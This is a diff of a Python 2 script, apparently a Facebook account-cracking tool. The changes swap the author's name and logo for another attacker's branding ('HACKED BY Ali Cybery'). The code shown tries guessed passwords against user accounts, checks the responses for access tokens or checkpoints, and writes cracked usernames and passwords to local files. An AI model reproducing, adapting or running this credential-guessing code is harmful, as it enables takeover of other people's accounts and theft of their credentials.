@@ -49,32 +49,22 @@ def cb():
 
 
 logo = """
-  
 
 
-\033[1;96m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:\033[1;95m♡
-      \033[1;96m▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒▒▒█▒▒▒▒▒▒▒▒▒▒::\033[1;94m♡
-     \033[1;96m:▒▒▒▒▒▒███▒█▒█▒███▒███▒▒▒▒▒▒▒▒▒▒:::\033[1;93m♡
-    \033[1;96m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒::::\033[1;92m♡      
-   \033[1;96m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::\033[1;91m♡         
-  \033[1;96m::▒▒▒▒▒▒\033[1;91mWhatsapp\033[1;96m▒▒▒▒▒▒▒▒▒▒▒▒▒::::\033[1;96m♡        
-  \033[1;96m:▒▒▒▒▒▒\033[1;93m+93747103773\033[1;96m▒▒▒▒▒▒▒▒▒▒▒:::::\033[1;92m♡
-     \033[1;92m███████▒▒Welcome To A.CREATIONS ▒▒████████
-\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mA.Creations\033[1;95m♡╭───•◈•───╮♡
-\033[1;94mAuthor\033[1;91m: \033[1;91mAadil_001
-\033[1;94mA.AKM\033[1;91m: \033[1;91▒▓██████████████]99.9
-\033[1;94mFacebook\033[1;91m: \033[1;91mhttps://www.facebook.com/hamza.aadil.391
-\033[1;94mWTelgrame\033[1;91m: \033[1;91m@AADIL_001
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mA.CREATIONS\033[1;95m♡╰───•◈•───╯♡"""
 
-        
+
+
+ 
+ 
+
+   
+
 --------------------------------------------------
  Author      : Emranøø Aadil
  GitHub      : https://github.com/Aadilafg001
  Facebook    : https://www.facebook.com/hamza.aadil.391
  Telegram    : @Aad8l_001 
 --------------------------------------------------
-
 """
 back = 0
 successful = []
@@ -97,7 +87,7 @@ def Ali():
     bch = raw_input(' ENTER NUMBER >> 01 << ')
     if bch == '':
         print '[!] Fill in correctly'
-        Emran()
+        Ali()
     elif bch == '01':
         os.system('clear')
         print logo
@@ -139,12 +129,12 @@ def Ali():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  no ' + pass1 + '\n' + '\n'
-                okb = open('save/ HACKED BY  Emran  Aadil  .txt', 'a')
+                okb = open('save/ HACKED BY Ali Cybery  .txt', 'a')
                 okb.write(k + c + user + '   ' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHACKED BY Emran Aadil \x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
+                print '\x1b[1;92mHACKED BY Ali Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '   ' + pass1 + '\n')
                 cps.close()
@@ -155,12 +145,12 @@ def Ali():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  NO  ' + pass1 + '\n' + '\n'
-                okb = open('save/ HACKED BY Emran Aadil  .txt', 'a')
+                okb = open('save/ HACKED BY Ali Cybery  .txt', 'a')
                 okb.write(k + c + user + '   ' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHACKED BY Emran Aadil \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
+                print '\x1b[1;92mHACKED BY Ali Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '    ' + pass2 + '\n')
                 cps.close()
